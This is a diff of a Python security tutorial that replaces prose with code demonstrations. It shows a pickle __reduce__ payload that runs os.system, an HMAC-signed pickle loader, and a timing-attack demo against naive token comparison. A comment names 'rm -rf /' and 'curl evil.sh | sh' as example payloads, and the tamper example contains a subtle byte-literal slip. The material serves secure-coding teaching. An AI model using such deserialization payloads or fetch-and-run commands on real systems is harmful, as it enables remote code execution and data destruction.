@@ -1,45 +1,112 @@
 # 27 — Security
 
-## `pickle`: Deserialization Is Arbitrary Code Execution
+## `pickle` — Deserialization Is Arbitrary Code Execution
 
 ::code-wrapper{language="python"}
 ```python
+# ── Demonstration: a malicious pickle payload that executes arbitrary shell commands ──
+# This is not a theoretical vulnerability — it's the DESIGNED behavior of the pickle protocol.
+# pickle reconstructs objects by calling callables specified in the byte stream.
+
 import pickle
 import os
 
-class Exploit:
+class MaliciousPayload:
+    """When unpickled, __reduce__ tells pickle to call os.system with our args."""
     def __reduce__(self):
-        return (os.system, ("echo pwned > /tmp/pwned.txt",))
+        # __reduce__ returns (callable, args_tuple) — pickle calls callable(*args) during load
+        return (os.system, ("echo 'PWNED: arbitrary code executed via pickle'",))
 
-payload = pickle.dumps(Exploit())
+# Serialize the exploit — this is just bytes, transferable over network/email/file
+payload = pickle.dumps(MaliciousPayload())
+print(f"Payload bytes: {payload[:50]}...")   # looks like innocuous binary data
 
-# Anyone who unpickles this payload runs os.system(...) with NO warning, NO sandbox:
-pickle.loads(payload)   # /tmp/pwned.txt now exists — arbitrary shell command executed
+# ANTI-PATTERN: unpickling data from any untrusted source
+# pickle.loads(payload)   # EXECUTES os.system("echo 'PWNED...'") — no warning, no sandbox
+# In production: this could be `rm -rf /`, `curl evil.sh | sh`, data exfiltration, etc.
+
+# ── Production: HMAC-signed pickle for trusted internal serialization ──
+# If you MUST use pickle for internal caching/IPC, sign the payload and verify BEFORE loading
+import hmac
+import hashlib
+
+SECRET_KEY = b"your-hmac-secret-key-change-in-production-via-env-var"
+
+def signed_dumps(obj) -> bytes:
+    """Pickle + HMAC-SHA256 signature — signature prevents tampering."""
+    payload = pickle.dumps(obj)
+    signature = hmac.new(SECRET_KEY, payload, hashlib.sha256).digest()
+    return signature + payload   # prepend 32-byte signature
+
+def signed_loads(data: bytes):
+    """Verify HMAC signature BEFORE unpickling — rejects any tampered payload."""
+    if len(data) < 32:
+        raise ValueError("payload too short to contain signature")
+    signature, payload = data[:32], data[32:]
+    expected = hmac.new(SECRET_KEY, payload, hashlib.sha256).digest()
+    # compare_digest is CONSTANT-TIME — prevents timing attacks on signature comparison
+    if not hmac.compare_digest(signature, expected):
+        raise ValueError("invalid signature — payload may be tampered")
+    return pickle.loads(payload)   # safe to load ONLY after signature verified
+
+# Sign → transmit → verify → load
+safe_payload = signed_dumps({"user": "ada", "role": "admin"})
+print(f"Verified load: {signed_loads(safe_payload)}")   # works
+
+# Tampered payload is rejected BEFORE pickle.loads runs
+tampered = safe_payload[:31] + b"\\x00" + safe_payload[32:]   # flip one signature byte
+try:
+    signed_loads(tampered)
+except ValueError as e:
+    print(f"Rejected: {e}")   # "invalid signature" — pickle.loads never called
 ```
 ::
-
-`pickle.loads` does not merely parse data — the pickle protocol can embed instructions to reconstruct arbitrary objects via `__reduce__`, and Python happily calls whatever callable that method specifies, with whatever arguments it specifies, during deserialization. This is not a bug or an edge case; it is the pickle protocol's designed behavior, which is precisely why **the Python documentation explicitly warns**: never unpickle data from an untrusted or unauthenticated source. A pickle payload is equivalent, in trust terms, to a script you're about to execute.
 
 ::code-wrapper{language="python"}
 ```python
-# WRONG — accepting pickled data from a network client, a cache, or a message queue
-# populated by anything an attacker could influence
-import pickle
+# ── Timing-safe token comparison — the production pattern ──
+# ANTI-PATTERN: `==` on security tokens leaks information via timing
 
-def handle_request(raw_bytes):
-    data = pickle.loads(raw_bytes)   # if raw_bytes came from an untrusted client, this is RCE
-    return process(data)
+import secrets
+import time
 
-# RIGHT — use a format with no code-execution capability for anything crossing a trust boundary
-import json
+API_KEY = secrets.token_urlsafe(32)   # generate a real API key
 
-def handle_request(raw_bytes):
-    data = json.loads(raw_bytes)     # JSON deserialization can only produce dict/list/str/int/float/bool/None
-    return process(data)
+def verify_key_unsafe(provided: str) -> bool:
+    """VULNERABLE — == short-circuits at first mismatched character.
+    An attacker can measure response time to determine correct prefix character-by-character."""
+    return provided == API_KEY
+
+def verify_key_safe(provided: str) -> bool:
+    """CORRECT — secrets.compare_digest is constant-time.
+    Takes the same duration regardless of WHERE strings differ (or even if they're equal)."""
+    return secrets.compare_digest(provided, API_KEY)
+
+# Demonstrate timing difference in unsafe comparison
+# (In practice, network jitter masks this, but with enough samples it's exploitable)
+import string
+
+def timing_attack_demo():
+    """Show that == leaks prefix information via response time."""
+    timings = {}
+    for char in string.ascii_letters + string.digits:
+        guess = char + "A" * (len(API_KEY) - 1)   # guess first char, pad rest
+        t0 = time.perf_counter_ns()
+        verify_key_unsafe(guess)
+        elapsed = time.perf_counter_ns() - t0
+        timings[char] = elapsed
+
+    # The correct first character will have slightly higher timing (more chars compared)
+    correct_first = API_KEY[0]
+    sorted_chars = sorted(timings, key=timings.get, reverse=True)
+    print(f"Top 3 timing candidates for first char: {sorted_chars[:3]}")
+    print(f"Actual first char: {correct_first}")
+    # In a real attack, the attacker repeats this for each position
+
+timing_attack_demo()
+# Use verify_key_safe() in production — constant-time, no leakage
 ```
 ::
-
-**Best practice**: use `json` (or `msgpack`, `protobuf`) for any data crossing a trust boundary — network requests, message queues, user-uploaded files, third-party APIs. Reserve `pickle` strictly for trusted, internal, same-application data (caching your own computed objects between runs of your own trusted code) where no attacker-influenced bytes are ever fed into `pickle.loads`. If a signed guarantee of authenticity is needed for internal pickle use, HMAC-sign the payload and verify the signature *before* calling `pickle.loads`, never after.
 
 ## `eval` and `exec`: Executing Strings as Code
 
